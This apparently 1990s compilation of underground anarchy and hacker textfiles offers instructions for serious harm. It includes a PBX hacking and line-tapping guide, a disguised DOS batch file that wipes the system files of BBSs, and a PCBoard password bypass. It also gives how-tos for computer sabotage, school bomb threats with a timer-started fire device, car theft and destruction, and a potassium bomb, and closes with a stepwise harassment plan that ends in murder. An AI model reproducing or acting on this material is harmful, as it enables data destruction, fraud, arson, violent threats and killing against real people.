11) Also our country would be a hell of a lot better of if we had lower taxes
        because then the private sector could spend more money on you, or in
        expanding their company, thus creating more jobs, thus having less
        welfare people, people who leach off of disability checks. If there
        were the jobs availble they would be a hell of a lot less people
        living on the street.

        Ok well i got'ta get going, got more plans and articles ti write in
future, and remember, these articles are for you reading pleasure, whether
you actually do some of the stuff in these articles is up to you. But if you
do decide to be careful and have fun dammit!

4.50 wuz here.uSu - united States underground                  By:Cyberglitch

                 A mini guide to scanning and hacking PBX's
          (Tho i must remind PBX'ing is an easy way to get caught)
               (and this was by request from one of my users)

        Ok basically you got'ta remember a few simple things for when you're
scanning for PBX's, never scan the 800-XXX-XXXX for PBX's, not only is that
stupid, but probally 1 out of ever 50 active 800 numbers probally have ANI on
them and alot of companies that own 800#'s will probally get reall pissed off
at you seeing that you've called just about everyone one of them that has ANI.
Basically it's not worth it unless you wanna fuck over a person you hate by
doing it from their phone, or taping into their phone box usually located on
the poles outside their house.

        Ok here's some helpful info when scanning for PBX's...

        1) Scan for PBX's during daylight hours, don't do it in the middle 
                of the night, that(so it's called) is phreaking and being
                a public nuisance, but no one really cares if they get a
                strange call during the day. Oh yeah don't *69 your calls
                unless you have the $4.00 a month thing for unlimited use
                of it.

        2) Scan for PBX's only in your local calling area, thus you won't
                get one huge ass motherfucking phone bill at the end of the
                month. Or if you want plug into someone else's line and with
                a labtop and internal modem for your laptop hook that into
                someone else's phone line, then scan any fucking exchange
                you wan't, just make sure you dial 958(or whatever number
                is used for ANI that tells you the number you're calling
                from), i mean afterall you wouldn't wanna hack into your own
                phone line or your parents. Hook into someone's line who you
                hate, can't stand, etc...

        3) Once you get your number start war-dialing at times you know they
                don't use their phone line. After all you don't wanna be
                wardialing and then they pickup and try to make a call and
                can't and spend a fucking hour trying to figure out why they
                can't call anywhere.

        4) Once you're done scanning on someone else's phone line, phreak a
                couple a friends, stores, etc... watch the fucker get into so
                much trouble. Hell dial 911 and scream into the phone then
                hangup, get your ass out of there, and watch the police be
                over his house in less then a few minutes.

        5) Ok now that you got your list of good numbers to use. You can
                either hack them from the line you've hooked into or your
                own line. Though it is highly suggested you hook into
                someone's line that's hardly ever used. This way if they
                people who own the PBX's won't come to your house, but rather
                the persons phone who you're hooked into. Hell if you don't
                even wanna use PBX's, hook yourself into someone else's line
                and just start charging up one huge ass motherfucking phone,
                then move onto the next victim's line. This will piss someone
                off so much, heh especially AT&T, SPRINT or whatever LD
                carrier the person's line you're hooked into uses.

        Ok now here are some helpful hints for hacking PBX's.

        1) If you get a PBX that has a CBV system(Call Back Verification)
                don't bother with these, unless it asks for the number to
                call back to. Use the number you're hooked into, don't use
                your own.

        2) When trying to guess password think of the following things...

                A) Using names, numbers(not your own), favorite items
                B) Use code names for government missions
                C) Use total random letters, just bash away at your keyboard
                D) Figure out how many digits you're dealing with and try out
                        every possible combination a human would use, not a
                        machine, since well a human probally set this
                        password, not a machine.
                E) Thing of things like kinky toys, sex positions, new
                        products, slogans, etc.. anything that might sound
                        like a good password. 
                F) Try any fucking thing you wan't

        Ok things to do once you're in...

        1) Look for an out-dial command and call around, run up big phone
                bills, if you wan't to try and frame someone else if you're
                using the PBX from your home phone, dial the same number of
                someone that lives under about 3 miles away from, make it
                appear that a friend is coming over your house a using this
                PBX.

        2) If you're hooked into someone else's line make sure you know the
                persons number or a number to a payphone if you need to
                leave one so someone call you back for voice validation.
                Never, never use your real number, becuase that'll probally
                be logged by the system you're calling as well as the PBX
                probally.

        3) When dialing out, make short phone calls very often, or one big
                huge ass call once every 2 weeks on different days choosen
                at random, to keep them confused(whoever owns the PBX)

        4) Allways remember before a PBX dies, use and abuse it as much as
                possible. You'll have a hell of alot more fun, but if you
                think someone is getting wise as to what you're doing, leave
                find another pole or chill out for a while, let things blow
                over so no suspicsion is risen about you.

        Allways remmeber have fucking fun. Look out for more kickass articles
from uSu in the near future. Cya,


Call CS for more uSu releases!uSu - united States underground                  By:Lurch
                                                 Revised:Cyberglitch

                        Fun with household appliances
                             Disclaimer:Fuck you

        Ok, welp, I'm leaving for the summer, so, don't expect to see me 
around for the next few weeks.  Unless they let me call LD from there, which 
I seriously doubt.  Ok, this was release before the summer, and it'll be one
the of the few text files from me for a while.

Description:
        This text file for you pyro's out there, and yes we know you like fire
don't deny it, it's true, you and everyone know it. uSu is not responsible if
you fuck yourself over. These are merely suggestions on what to do.

        Okey, let's jump right in, and, let you enjoy...

   ---- Lighters

        Ok, this requires one of those lighters which release GAS...NOT 
FLUID! (you will have a first degree burn if it's fluid) What you have to do
first, is get acquainted with the lighter.  Make sure you can light it up
from the first try, make sure, you can light it up for a second, and then
shut it off, and, make sure you can do it so that the gas is being released
without burning. Now, comes the fun part.  I would suggest doing this with a
friend first, and, doing this in your hands.
 
   ---- Hands:(ez)

        Put your hands together so they are closed on all sides except for a
little opening on the top.  Ask your friend to insert the lighter and let
some gas out in your hands, do this for LESS THEN 2 SECONDS, more will
probably hurt. A lot more will probably burn.  Now, close your hands so the
gas is contained inseide, and, can't get out, get ready, and, let your 
friend, put the lighter back between your palms quickly and light it for a
moment.  As soon as there is a click(from the spark) move your hands quickly
apart.  This produces an awesome effect, especially in the dark.  This looks
like you are carying flames.  Awesome to do at a dance.

   ---- Mouth:(more advanced, for bigger more experinced pyros)

        This is a little more dangerous, so, if you are afraid, or haven't
tried the hand technique, don't try this.  It is exactly the same, except,
you can do this by yourself.  Insert the lighter in your mouth.  Close your
lips and let some gas out.  MAKE SURE you don't breather at this time, one,
because it will not work, 2, because many of the gases in lighters are
lethal.  Now, take away the lighter, and close your mouth.  Wait like 1/2 a
second, reinsert the lighter and click it on for a VERY short time.  At the
same time open your mouth.  I understand this sounds dangerous, but, if you
do it right, and don't release gas in your mouth for more than 2 seconds, all
you will feel is a little warmth.  As you open your mouth, this will produce
a short but EXTREMELY awesome effecty of fire flying out of your mouth.
Great for dark places.

   ---- Aerosol Cans

        This is always cool, absolutely NOT dangerous, and, fun to prank 
with. Take an aerosol can, and a lighter, and do the following for whichever
can you have.

   ---- Rapid Spray:(MUCH more fun)

        Ok, a few things you can do with this...One, start releasing the spray
(ALL of them are flamable, if you find one that isn't, tell me about it).
Put the lighter in the line of fire, and light.  This produces the most
awesome effect. It is a blow torch, which is NOT hot.  You can put your hands
in the flame, and, most likely you won't even feel it.(no guarantees, but..)

Kinda Got Cut off at the bottom..  As much as I could - 4.50uSu - united States underground                         By:Mind Bender

                 Chemical equvilents and how to get them.
                (Hey you, yeah you, your Disclaimer HERE!)

        There is a chart of chemicals and their household names that is spred
under about 150 different names.  This list is useful, but it doesn't go into
much detail.  I decided to make this list a little more deatailed, like where
to get them and where to find better quality stuff.

------------------------------------------------------------------------------

   ---- Acetic acid     =       vinegar

    you could buy this in a store, but it usually has impurities and is
diluted in water. You might be able to find some higher grade stuff by asking
for it but most stores don't carry it.  If they do say you need it to kill
some plants but you don't want to use plant killer because you have a baby
brother or sister and the plant killer could be poisonous if they got into
it.  Say the plant is indoors to and mention that if the child was to get
into the plant the plant killer would be toxic.  Tell them that the stuff
on display is not strong enough.  If they refuse to give it to you just
say you will "take your business elsewhere" this usually does the trick, if
it still doesn't work, just walk out and comeback later when a different
person is there.

   ---- ammonium hydroxate      =       ammonia

    just walk into a store and buy some, you can usually find undiluted stuff
in a store, if not, get a chemical supply catalog.

   ---- carbon carbonate        =       chalk

    Duh, if you can't find pure stuff, tough shit, i never got any high-grade
shit

   ---- calcium sulfate         =       plaster of paris

        Just walk into an art store, they usually have 100% pure stuff

   ---- graphite                =       pencil lead
just walk into an art store and ask for some 100% graphite pencils, they 
usually wont question you about it.  

   ---- magnesium silicate      =       Talc

    this is makeup, you could steal some from a live playhouse :), or buy
some

   ---- naphthalene             =       mothballs

    walk into store and buy some, be sure they are 100% pure, they need to be
grinded for use in most bombs.

   ---- sodium bicarbonate      =       baking soda

    usually pure, just buy it

        Have anarchy phun, l8r's

         uSu - united States underground. uSu was created January 15, 1993 by
Cyberglitch. uSu was created to inform/serve/and teach the public about the
mishaps and screwups of the industrial and governmental authorities. By
letting people know what's really going on, it only insures everyone a self
awareness, in not being left out. uSu covers the PEACH MTV scene, Phreaking/
Elite/Anarchy/Carding/Hacking Music/Trojan/Virii, and feels that if you wanna
know about it, then you should know about it. It's everyones right to know
about it. And is it would seem this country get's worse and worse, day by
day. Let's do something about it, show your government that the people are in
control. 


                         . How does one Join uSu? .

         You might be asking yourself, oh what chance do i have in getting in
a PEACH MTV group. Well you'll never know unless you try. If you think you
can write about the scene, come let us know. We'll let you know straight
foward if you're uSu material. We won't bullshit you, we're here to educate
you. Not to leave you in the dark. If you have some good ideas, send us some
samples along with your handle and a number to get back to you at. If we like
your material we'll release it as the next uSu release. So if you think you
can write quality material, come let us know. We're allways interested. We
invite you to logon to the WHQ of uSu, Crainiul Shutdown, call 201-763-8971

                       . How does one Join uSu-Net? .

         To join uSuNet, one is required to logon to Crainiul Shutdown and
logon as new and DL the Application packet, or look around for uSuNet02.Zip
on one of your favorite PEACH MTV BBS's near you. Send us your application,
i've revised the rules a bit, as long as your BBS is a PEACH MTV board, then
you deserve to belong in uSuNet, though you will need to setup something like
Front Door and must be up and fully running. There is no longer any limit to
the number of Nodes in uSuNet, we believe that the whole scene should be
informed, not just a fragment. uSu is based upon unity, trust in one another
PEACH MTV'er.

uSu - united States underground                       Written By: Napalm Death
                        How to take down alot of BBSs
                                                                         [uSu]
1. Make a batch file like this:
------------------------------------------------------------------------------
@ECHO OFF
cd\dos
del *.exe
del *.com
del *.sys
cd\
del *.bat
del *.sys
------------------------------------------------------------------------------
2. Save that file as PKZIP.BAT and convert it to EXE using 
BAT2EXEC.EXE, now zip it up in another file, and then upload 
the file, when the File Scanner scans it. It will unzip it, 
go into the zip and test the files, then it will zip it back up
PKZIP and then it will run the batch file, No more DOS or other files!

3. If your a SysOp just make it so your upload processer 
doesn't except PKZIP.EXE or PKUNZIP.EXE, That will make it so 
if they upload it, It will delete that file right away!

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
This is too small to put in another text file, but it is 
useful, Ever call a Pcboard BBS and you want to get on but you 
don't know the NUP, well on some boards (ALOT OF THEM) type 
`Y Q' when it asks if you want ansi, and it will bypass the 
NUP and just enter handle and start to apply, Simple as that.

               Word of encouragment to the Elite BBS's out there

        Ok everyone know that pirate/elite BBS's are supposedly bad, but to
tell you the truth that's solefully untrue. For the most part, pirate/elite
BBS's help software get spread around. Little companies that were never
known before that made something good get reconized really quick on the
pirate scene. And alot of the already big companies just get more reconition.

        To let you know one thing, most companies purposely release their
software to the priate/elite scene. Why is this you ask? Well they know that
the pirate/elite scene will spread that shit around so fast, and some many
people will try out the game, and let people know what they think. Reviews
are written, bugs and glitches are spotted. And thus software companies get
free Alpha and Beta testing done without having to pay a dime. Besides that
as i fondly remember Alpha's and Beta's of software are not illegal to have
on your BBS, since well they are Alpha's and Beta's. Final Sales releases
are a different story, but it's not like you care about those anyways :).

        Well just a few more things to let you know. Most BBS's don't go down
because the SPA takes them down, that's such bullshit. The only reason why
the SPA and other government agencies go after anyone is becuase they look
for the most expensive and popular BBS's and take them down. Turn around a
sell the hardware. I mean what else do you think they did will all of the
hardware Rusty and Eddie's had? 

        Charging people for No Ratio DL access is a no no. You'll get caught
easily that way. Donating for leach however is a good idea. Because if anyone
asks you can merely say that, well this person donated money to my BBS and
i'm be grateful and giving them leach for their kind notion. Oh well can't
do shit about that.

        Also please note a few things. The SPA doesn't do anything really, I
mean you could call up the SPA and report an Elite BBS, and they probally
wouldn't do anything about it. In fact the only time they probally will is
when there is money involved that THEY can get their hands on. I mean have
you ever heard of anyone getting arrested over having a pirated copy of DOOM
or DOOM ][? I mean come on, if it's worth that much to them fine go out buy
the game for whatever it costs.

        So next time a user logs onto your pirate BBS and says he's gonna
take you down if you don't give him access. Tell him to go fuck himself, and
you're not worried at fucking all. Because there is really nothing he can do.
And no one is that stupid to try and take down an Elite BBS. Let alone the
other ones with it, 'cuz what's the point of doing that? He'll never get on a
Elite BBS, which was his purpose in the first place.

        Also please note the fact that certain people who are to be black-
should be the assholes who go around and charge people for access to their
BBS's and fuck with them while they're DL'ing what they are supposed to, and
asking them where they're gonna be uploading to and shit like that. In the
pirate/elite scene we don't need assholes like that. Also other assholes to
be blacklisted are assholes who say they're gonna take your BBS down if they
don't get access. Please these type of people don't deserve to call any kind
of BBS. 'Cuz knowing them they probally got rejected off of PD BBS's as well.

        Tips and points of NUP's and your NUV. First of all if you don't 
wan't assholes on your BBS have a NUP. If they can find out your NUP then
they deserve a chance. Your NUV should be fair, like same number of YES votes
to NO votes. 10 Yes to like 2 no is absolutely insane.
        
        And if some punk shows up at your door complaining they want access
to your BBS just kick their sorry asses away. Also if the Police or FBI show
up your door you must remember they CANNOT enter your home unless they have
a search warrant. If they don't oh well if they force themselves in to take
your BBS down then there is nothing they can charge with. Becuase their
evidence was gained illegally. Remember don't take shit from these type of
assholelish people, Cya,

-----------------------------------------------------------------------------

Merry Christmas!!
 
T'was the night before Christmas
When all through the house
Everyone felt shitty, even the mouse
 
With mom at the whorehouse
And dad smoking grass
I just settled down, for a nice piece of ass
 
When out on the lawn 
I saw a big dick
I knew in a moment
It must be St. Nick
 
He came down the chimney 
Like a bat out of hell
I knew right away
The fat fucker fell
 
He filled all the stockings
With condoms and beer
And a big rubber dick
For my brother, the queer
 
He went up the chimney
With a tremendous fart, the
Son of a bitch, blew the chimney apart
 
He swore and he cursed
As he rode out of sight
"I'll piss on you all, it will be my delight!!!"

-----------------------------------------------------------------------------

Answering machine hacking                               


        an easy way to hack answering machines is to just strat pressing
        buttons until something happens.  This is easy, but there is too
        much luck envolved.  


        another is to find out what kind of ansering machine they have
        and go buy one and check out the controls.  Then return it and
        say "it didn't work right with my line" or some other excuse
        this makes it easiser to hack because you know the right buttons
        and all that crap.


                NoW HeRe are some nice messages




        THE police office


        hi, we cant some to the phone right now.  if it is an emergency sit
        back and die.  If you fell like it we can be reached at Noah's donut
        shop.




        Private residence


        we aren't home.  please call back later.  FUCK YOU!!!!

How to make a real good school bomb threat                        
                                                                     
        Yeah sure anyone can call a bomb threat from a pay phone.  it isn't
that hard so any dickshit can do it.  Here are a few twists on a klassick.

        -for starters call a bomb threat from a pay fone in the school or 
better yet, from the school office!!!  From a pay fone is risky because 
most school pay fones are near the office and most schools have caller id so
they will look at the fones when they see the number.  What you must do is 
make sure only 1 person(this is important, no more than 1) is in the office
then call use *67 then the number, on most systems this blocks caller id.  
just say "there is a bomb in the school" and hang up.  make sure it is short
under a second  if possible, say it fast and clearly.  they will call off
the school day if you are lucky.  Since you usually have to make up 
bomb-days at the end of the school year this is best used when you didn't do
your homework or something.  Try to hide your voice.  after you male the   
threat run like hell until you are out of site then walk like nothing 
happened.  if they saw you keep on running.  be sure no one sees you during
any of this!


        Calling from the school office is hard.  First of all nobody must
be in the office.  you must be quick and try to hide your voice.  call a  
class room or call the police and tell them.  Be quick try to make it less
than five seconds.  Then run like hell until you are out of site then walk like
nothing happened, unless they saw you.  If they saw you run like hell!  make
sure nobody sees you during the whole thing.


        -For added effect make a real time bomb.  There are other textz that     
explain it.  Make sure you wear gloves when buying the parts and making the 
bomb.  always buy new parts!!!  fingerprints can be traced back to you. go
shopping for parts in the winter when you wont look weird while wearing 
gloves.  Also purchase on the black market. THen they cant trace you.  


        -To really scare the shit out of someone call a bomb threat and then
take the alarm clock you bought while wearing gloves and set it to ring.  
make sure it has a bell for added effect.  when it goes off people will think
that a bomb will go when there is only a clock(unless you attached a bomb;) )



        -1 last thing.  i said i would'nt tell you how you make a time bomb
but here is a simply explanation.  take one of those lamp timers that 
rgulate when the outlet is on of off and plug in a a cord with the end fraied
put the fraied side on top of a piles of matches on of some paper and if you
did it right and they kept the power on when they searched.  it will start a
fire without warning.  just set the timer to go off when you want the fire to
start.  this isn't the best method but it works.

Some Really cool ways to wreck computers                



        There are many ways to damage computers, this file has some old ones
some ones i have thought up.  Here goes....


                        Without getting in the computer

        -Take a disk and open that little steel thinngy and put some holes in
the magnetic stuff.  Put the disk in the drive and try to get the PC to read 
it.  If you are lucky you will damage the drive and will cost the owners some
bucks to fix it.  If not, try again, at least the disk is screwed up.

        -Turn the computer on and off very rapidly for a while.  This can have
some really cool side effects, it could erase the HD and mabye even do some 
other worse things to it.  

        -Stick any and all small objects you find into the disk drives.

        -Yank the holder of the CD-Rom of the CD-ROM drive (the thing that
holds the CD-ROM disk itself) this is a really cool way to phuck things up.

        -Take a pocketknife and whittle (like you would with a stick) a few
layers of platic of some of the cables, until you expose the wires.

        -Put water in the disk drives. 

        -Get some duct tape and tape the little thing that air from the fan
comes out of shut so it is air tight.

        -Cut wires and cables all around the computer.


        -Put water in any openings on the computer


        -Steal the keys.


        -Go to your local computer store and say you lost the keys to your 
colputer.  For a few bucks they will give you a whole ring of keys.  Take 
their keys and lock the computer, if they get a replacement just steal the 
keys again and lock it.  Drives the owner into iNSaNiTY.


        -Put duct tape all over the monitor.


        -Oh Hell, just put duct tape all over the entire computer.  This 
becomes a real pain in the ass to the owner and provides hours of 
entertainment to you.  The only downside is that this takes a while.


        -Delete the autoexec.bat, config.sys, and command.com files.  


        -First delete the entire hard drive with the del (or deltree) command
then format the drive, this way it is almost impossible to unformat.  Damage 
their backup disks if you can find them.


        -In windows shell to dos and then go to the c:\ and then leave, this
can be a real pain in the ass to an unexperience user and is phun


        -Turn on a screen saver in windows and put a password on it.  But 
first delete their autoexec.bat config.sys and command.com files and choose
the windows screen saver that prints words on the screen and make it say "
your system files are gone, if you turn off this computer without breaking 
the password on this your computer is shot" or something along those lines.
Make sure you kill all their bootable floopies.  Make a password that is a
bunch of letter and numbers like 36gq36gq57yh46hkw that you don't know and
is almost impossible to break even by the most experienced cracker.  This
is a real fun one.



        -Use your sick imagination.


        If you can get inside the computer the REAL fun begins HA HA HA
        Basicly just break anything, here are a few creative ideas for 
        totaly cool damage!

        -Snip a single wire and let the person find out which one is
        messed up.

        
        -Take out the microprocessor and do one of the following;

                -Take it for your computer

                -Break it in half and put it one their keyboard with 
                a nasty message next to it.

                -Put it on the operators chair with the sharp things up
                this really hurts!

                -toss it somewhere inside the computer.


                -Take a single sharp thing out and put it back in


        

        -Melt anything



        -Strip all the wires.


        -Steal the SIMMs



        -Steal anything of value



        -Crack the motherboard


        -Take out all the inards leaving the shell BIG LAFFZ


        -Remove a single chip


        -Take out the RAM and ROM CHips

      
        -Remove the HD


        -Put a smoke bomb in it.


        -Best of all....
        DRuM RoLL

        Take a nice long piss in it.
        (Make sure there is no voltage or you will have a Krispy Pecker)

        -Use your sick imagination



        ENJOY                   -Mind bender

A new and PHUN!! way to destroy cars.                   


        is there some phucker you hate.  Do you want revenge?  well here is 
a daring but Easy way
                                                                     
                                                        

        1.  get there car.
        2. break in it.
        3.  Hot wire it buy opening the dash and crossing two wires of
        the same color(this usually works) or 2 red wires.  now drive off
        to somewhere far away.
        5. here is the daring part.  keep the car on but stop it.  put
        it in the highest gear that is possible.  
        6. drop a brick on the gas petal and jump out fast!!!!!!!
        7.  it helps to break off the door. one time my phriend had the door
        shut on him, luckily he stoped the car.  the last thing we need is a
        dead anarchist.GOTO   :)
        8.  watch the car go off in to the sunset and him something(or 
        someONE if you are lucky :) ) or run like hell (use your judgement)
        9. hotwire the car.
        10. have PHUN

Phun with plants                                        



        to prevent plats from growing simply spread salt all over the soil
        Xpensive to remove and makes their yard look like a neo-nazi's
        head:).  


        if you spray off(repelent) on the plant and lite it it makes the
        plant wilt and leaves no burn marks if you use the right amount


        if you cut bark around a tree all the way around like a ring it will
        kill the tree.  Be sure to cut deep in.


        that miracle-grow stuff can be used in large amouts on areas where
        someone doesn't want any plats to make things grow from no where


        plant dandelions in their yard(:))

Ruin someones life                                      
                original cocept by jolly roger


                this file is the same type of file as 
                operation fuckup from jolly rogers cookbook
                i took the large harassment idea and rewrote
                it.  EnJoY!



                before you start this procedure here you must get a victim
                however, due to the large quota of assholes in this world
                that is the easiest part.  After you have a victim 
                wait about 1 month before starting this then do it 
                but leave no hints that you are resposible.



        PART ONE, yer victims car


        you might want to start by removing his licence plates.  Then
        you might want to remove his winsheild wipers. If this doesn't
        work, paint is car.  Speedball printing ink is the hardest type
        to remove.  just make sure it isn't water soulable.  if the message
        doesn't get to your victim, break his windows and lights.  This
        should do the trick.  If the phucker still doesn't get the idea 
        you might want to hotwire his car and keep it.  If you aren't
        into stealing, hotwire it and part it in a tow away zone.

        Most people will get the idea by now and leave town etc.
        but if they don't it is time for.....

        PART TWO, their job.

        for starters, you might want to pose as him and call up his
        boss and say you quit and call the boss a fucker.  or you
        could pose as a manager.  
        SAMPLE DIALOGUE

        You:  sir i am from the executive board or ShitLoad inc
        and i am afraid we will have to let you go due to your
        stupidity.  Your possessions at the office will be shipped
        to you.
        Him: but what did i do wrong?
        YOU:i told you now goodbye and don't come back.
        klick

        if you happen to be female or have a female friend, you can
        get him fired and in trouble with the law by calling from a
        payfone and saying that the victim has been sexualy harassig
        you. 


        this is bad, but some fuckers are so thick skulled that they
        wont get the idea.  not it is time for....


        PART THREE, his residence

        you might want to start by salting his lawn, or pour lighter
        fluid on his lawn and light it.  a random shot in a window is
        surely scary for your victim.  if you must, light his house
        on fire with the help of some thermite.


        IF THE FUCKHEAD STILL DOESN'T GET THE IDEA
        THEN it is time for.....


        PART FOUR, murder

        this is only for the very sick, but to murder someone the 
        best way is to wait in his car then, as soon as he sees you
        gag him and cut his head off.  Leave the country immideatley
        and be sure you dispose of the clothes you are wearing and 
        the weapon.  You will look less suspisous if you get 
        plane tickets a few months in advance and have a relitave
        that lives in the country you are fleeing to.

Subject: IRC being used for software piracy (Warez)

Lines: 3273

	I have had for some time information about the use of the internet
for transfer of illegal pirated software. Recently, however, I have realized
the severity of the situation, to the tune of thousands of software pirates
using IRC to further their crime. In the past, lists of ftp sites abused to
this end have been posted, I have obtained a list of the people who frequent
the "warez" IRC channels (#warez, #warez1, #warez2, #warez3, #warez4,
#warez5, #warez6, and possibly others). Since these channels are usually
invite only, they are often hard to get into, and because those people will
not tolerate anyone who does not take part in their crime, I was not able to
stay in long to get detailed logs of their conversations. However, it is
quite obvious that they openly trade pirated software (even from spending
several minutes in the channel, this can be observed) and do not use these
channels for legitimate means. It would seem that the lower numbered
(#warez, #warez2) channels are the most exclusive, available to only those
thieves with the newest "zero day" pirated software.

	From /who listings, I am appending a listing of people who have
frequently been in the #warez* channels. Complete who listings would be
posted, but they are quite large in volume and duplicates among different
channels and different IRCNAME's would have to be removed, bringing us back
to the exact same listing. Names are in standard IRC nick!user@host format,
a best attempt was made to sort them in reverse (domain, subdomain, host,
user, nick), to make it easier for administrators to search for their own
system.

	It is *STRONGLY* recommended that administrators of systems in which
these users are on check their directories for pirated software or
extremely large disk usage.

	Gross misuse of the Internet such as this, and the toleration of it,
brings us one step closer to the regulation of the internet that would
essentially destroy it. Help work with the anarchy to save it. And if you
don't care about the net and the millions of people it affects, at least
care about yourself and the risk you incur by allowing pirated software to
be traded through your system, even unknowingly.

	It would be much better for the media to learn that a problem was
recognized and dealt with than for them to report "software piracy runs
rampant on the Internet, system adminstrators do nothing to stop it." This
is not a case of free speech or violations of an ancient law, but of a
serious problem that cannot be ignored.

                The rotherhood f Gods and etards  
           "Potassium and Basketball...a deadly combination..."
             A 1/2 story half tutorial by The Digital Hunter 

   This tale I am about to tell you was passed on to me in english class, 
while lurking in a corner sharing rumors one of my chums told me a story about
a Boy, his basketball, and a chunck of potassium...here goes.

   Potassium, as you may or may not know, is highly reactive...often kept in
formaldahyde it has a violent reaction with water, it will incinerate itself
and generate heat in excess of 4000...in other words don't get water near 
it.  Apparently this knowledge was passed on to the wrong person because a 
junior in my school a few years back had stolen a chunck of potassium from 
the school chemistry lab, and had plans for it...We weren't sure what they 
were, we may never be sure but you can bet it would have been almost as cool
as what actually happened...well, like I said he took it and stuck it in his 
pocket, and went through the day fine.  But, after school he saw some kids 
throwing around a basketball and decided to join in on the fun, and had played
for over an hour when the sweat had soaked into his shorts, and -OOM- touched
the potassium...this kids entire leg went up...

  We didn't believe him so we went to our english teacher, who confirmed the 
  story and added a little detail..."I was out there, being the english 
  teacher as well as cross country coach, and was the first on the scene...it
  smelled like a sick barbeque of pork and hair, leaving a terrible stench in 
  the air...the medical team dragged him off into the bathroom, where they 
  stripped him down and began to work on his wound...his entire leg was burnt 
  up...I waited outside and while I was talking to another member of faculty
  another kid had wondered into the bathroom, shouted "His dick is black!" 
  and ran out..." 

So there it was, staring us right in the face that potassium and basketball 
don't mix...This story I have told you is true, the names have been changed to
protect the innocent...and now onto Part Two of this File: 

              "How to make your own Potassium bomb"

   First step is the most difficult, how to get the potassium...It seems the
only way to really get it is to snag it from the school science lab, which is
easier said then done.  I became a teachers assistant to the science teacher,
which aside from giveing me a credit in practical arts gave me both trust and
access to the chemistry lab.  From here on in it wasn't that hard...grab it,
wrap it in a little plastic bag, and head on out.  I wasn't the first kid
on my block to grab one, my friend Brian was, and when he showed up with the
chunck of silver metal in his hand I nearly shit my pants, as much from the 
mere possibilities as to the frightening image of one of my friends' hands 
going up in flames...Now the problem was how to get the bitch to go off.  We
talked about putting it in the street and spraying it with a super soaker, 
but decided against that...so next we ried a bunch of stuff, until finally 
I came up with this design...we took a coke bottle and filled it up with 
water, and then took a small glass container, put a small chunck of potassium
inside and made sure it was water proof...BE SURE, YOU DON'T GET A SECOND 
CHANCE.  Next, we went outside, and threw it as far as we could and ran.  When
it hit the ground the bottle on the outside shattered first, sending water 
on the street, when the smaller bottle inside hit, shattering it and putting
the potasisum to the water...it worked like a charm, and we were greeted with
a great fire works show...This bomb is pretyy expensive, about $3 per time, 
and kind of dangerous so don't try it unless you're either a)drunk

The ideas presented here are not nessicarly the views of BGR and its members!

                                       
  
  First off, I would like to make it VERY fucking clear, that `BGR' is 
      pronounced "Bee Gee Ahrrr"  NOT "Buh Gaa Ahrr".  Thank you.

                  Hungry like the people in afrika!"



    Does any of the  above sound formiliar to you?  These are a sampling of 
    the lies the american government spreads.  Did you know that the bigest
    occupation in the country is for the government? The government is full
    of  all these funky little branches which control us. Example: the NSA.
    "No  Such  Agency" as it  used to some times be refeard to. Actually it 
    is  the "National Security Agency".  What the fuck, so that  leaves  us
    what  2  agencies,  the CIA  and Secret Service. Hmm, Is that it? Yeah,
    It MIGHT be it. And if you belive that one, you'll  probally  belive  i
    stuck in George Bush's body for a day, that just happened to be the day
    some one tried to assasinate him. The assain was really trying to  kill
    me. Yeah, Sure.  Well, My point is, that our government is  so  worried 
    that we as people will find out what they are up to and try to  stop it
    VIA revolution! What else would they need all those agencies and police    
    for, if they didn't want to make sure we where peaceful and oblivious to
    the whole fact that the whole fucking government is a SHAM. One Law for
    them, and one law for us... They tell us to do one thing and go and  do
    another. "Keep your nose out of our [the governments] bussiness."  Then 
    They   go   and   fuck   with    some    other    countries  government.


    The US government was single handedly responsible for the  collapse  of 
    the USSR. Now, Don't get me  wrong,  i'm  not  a  communist,  and  most 
    certainly not a leftist or rightist, But the people of the  USSR  where 
    Better off under communism. At least they had no fear of the  out  side 
    world. Under communism, their goverment didn't tell them ANY THING. Un-
    like our government which tells us pure LIES. So they where  totaly out 
    of touch with the out side world right? We'll we come along and break a
    open a hole that leads to the "FREE WORLD". Then, They take their lifes
    and support democracy, They finnaly get it and BOOM, they don't have to
    work... They don't have to breath, they can do any thing they want.. As
    long as it doesn't upset the american government. So they just sit back
    and live with nothing, and make nothing out of their at  one  point  in 
    time,  valuable  lifes.  We  plain  and  simply fucked over millions of 
    people, because  our  piss  assed  government  saw  the  communists  as 
    compitition.

    What are we going to do when the government starts seeing  Hackers  and
    phreakers as competition? What are we going to do  when  they  see  the
    working class as competition? What are we going to do when they  decide 
    for us to send us off to some unwanted war, because we are  the  worth-
    less underclasses? I WONT  PAY FOR  THEIR  "LIBERTY" WITH MY LIFE. WILL
    YOU? 

            
                        I can never betray
                        You or my self,
                        For my lot,
                        Remains bound to your lot,
                        My future,
                        To your future,
                        And i say to you now,
                        One day,
                        I Will guide you,
                        To a NEW FREEDOM.


   
                                       

  One day, the system started a hopeless war, for a useless cause
  and the system started to be defeated by another system of  un-   
  predicted force. The system called the little working class man
  in front of it. The man came unwillingly, as  if dragged  by an
  unknown force. The little man snarled "What Do you  want?"  and
  the system responed with a tone of unjustified  power  in  it's 
  voice "You must go off and fight our war and die for our cause"
  The statement was followed by tense heavy silence. Heavy footed
  pounding filled the air, White clenched fists  lustered in  the 
  Unusualy thick air. And slowly, behind the little man filled in
  the bootboys. They moved as one, through the  back  streets  of 
  America, gathering together in shadowy  formation.  The  little
  man started to  talk as  the  skinheads  stood  with  hands  in 
  pockets,  Broad shoulders hunched forward tensley, with a faint 
  ciggrette glow here and there.  He stood their, with the  crews
  of the nation behind him, and the light  shinning  off  of  his
  hardened face, Speaking slowly and calmly he said "I wont fight
  because you tell me to, So watch your  back  when  you  attack,
  cause we might just turn on you."  The system shaked with fear,
  fear of loss of power, and money, with the fear of looking weak
  to the other systems, and most importantly, with the fear  that 
  they would be exposed..

                        To be continued if enough people send me email
                                telling me to finish the story.

                     "Bix -> Internet Account"
                                by
                             rillion

   Intro
      
      Well, basicly, BIX is a system run on CoSy software, that stands for
   Byte Info eXchange. It's now owned by the same company as Delphi, so
   a lot of the things it uses (like USENET feeds) come off of Delphi.
   This system has to be one of the easiest things to get an account on.
   It sucks otherwise, meaning half the things on it don't work. I 
   personally dislike the software. It uses its own FTP, which is getting
   better, but needs a lot of work. You can connect to it via any
   Tymnet or Sprintnet port. Just type 'bix' at login. The payment system 
   is just about the same as Delphi's. To get an account call the number
